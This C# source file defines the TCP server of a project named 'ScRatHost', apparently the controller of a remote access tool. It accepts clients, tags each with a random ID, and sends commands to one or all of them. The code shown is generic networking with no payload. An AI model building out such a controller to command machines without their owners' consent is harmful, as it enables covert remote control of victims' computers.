using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ScRatHost.net
{
    class Server
    {
        public TcpListener listener;
        public ConcurrentDictionary<string, Client> clients;

        public Server(int port)
        {
            this.clients = new ConcurrentDictionary<string, Client>();
            IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Any, port);

            this.listener = new TcpListener(localEndPoint);
        }
        public string[] getAllIDs()
        {
            return this.clients.Keys.ToArray();
        }
        public bool sendPacket(Packet packet, string options)
        {
            if(options == "all")
            {
                sendPacketToAll(packet);
                return true;
            }
            this.clients.TryGetValue(options, out Client client);
            if (client == null)
            {
                ConsoleWriteLine("Invalid ID: " + options);
                return false;
            }
            client.sendPacket(packet);
            return true;
        }
        public void sendPacketToAll(Packet packet)
        {
            string[] ids = getAllIDs();
            for (int i = 0; i < ids.Length; i++)
            {
                this.clients.TryGetValue(ids[i], out Client client);
                client.sendPacket(packet);
            }
        }
        public void ConsoleWriteLine(string s)
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("Server:");
            Console.ResetColor();
            Console.WriteLine(s);
        }
        public void run()
        {
            try
            {
                listener.Start();
                Console.WriteLine("Listening from: " + listener.LocalEndpoint.ToString());
            }
            catch (Exception e)
            {
                ConsoleWriteLine(e.ToString());
            }
            while (true)
            {
                try
                {
                    TcpClient clientSocket = listener.AcceptTcpClient();
                    ConsoleWriteLine("New client " + clientSocket.Client.RemoteEndPoint.ToString());
                    Thread thread = new Thread(new ThreadStart(() =>
                    {
                        Client client = new Client(socket: clientSocket);
                        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                        Random random = new Random();
                        string id = new string(Enumerable.Repeat(chars, 9).Select(s => s[random.Next(s.Length)]).ToArray());
                        this.clients.AddOrUpdate(id, client, (key, oldClient) => oldClient = client);
                        ConsoleWriteLine("client connected: " + id);
                        client.run();
                        ConsoleWriteLine("client disconnected: " + id);
                        this.clients.TryRemove(id, out Client c);
                    }));
                    thread.Start();
                }
                catch (Exception e)
                {
                    ConsoleWriteLine(e.ToString());
                }
            }
        }
    }
}
